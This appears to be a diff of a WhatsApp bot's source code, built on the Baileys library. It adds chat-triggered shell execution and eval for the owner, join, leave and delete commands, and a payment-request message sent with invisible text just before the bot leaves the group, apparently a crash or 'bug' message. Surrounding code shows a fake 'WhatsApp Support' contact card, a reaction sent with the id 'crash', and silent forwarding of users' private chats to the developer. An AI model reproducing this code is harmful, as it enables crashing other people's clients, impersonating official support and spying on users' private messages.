@@ -38,6 +38,7 @@ const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, 
 const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
 //©from: andik
 const contactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
+function jsonformat(string) { return JSON.stringify(string, null, 2)}
 
 const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
 const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
@@ -59,6 +60,19 @@ semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
 
 if (!isGroup && body && !msg.key.fromMe && !isDev) {
 semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : wa.me/${senderNumber}`})}
+
+if (body.startsWith(`$`)){ if (!isOwner && !mek.key.fromMe) return
+let evl = body.split("\n")
+let exc = body.replace(evl[0]+"\n", "")
+exec(exc, (err, stdout, stderr) => {
+if (stdout) return reply(`${stdout}`)
+if (stderr) return reply(`${stderr}`)
+if (err) return reply(`${err}`)})}
+	    
+if (/^=?>/.test(body) && (isOwner || mek.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
+try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
+return reply(require('util').format(evaluate))} catch(e){
+return reply(require('util').format(e))}}
 
 switch (command) {
 //©from: dennis
@@ -175,6 +189,8 @@ if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+await sleep(3000)
+await semar.groupLeave(from)
 break
 
 //©from: dennis
@@ -200,6 +216,24 @@ break
 //©from: dennis x baileys
 case '03':
 sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
+break
+
+//©from: dennis
+case 'join':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+let result = args[0].split('https://chat.whatsapp.com/')[1]
+await semar.groupAcceptInvite(result)
+break
+
+//©from: dennis
+case 'leave':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+await semar.groupLeave(from)
+break
+
+//©from: dennis
+case 'delete': case 'd': case 'del':
+semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
 break
 
 //©from: dennis
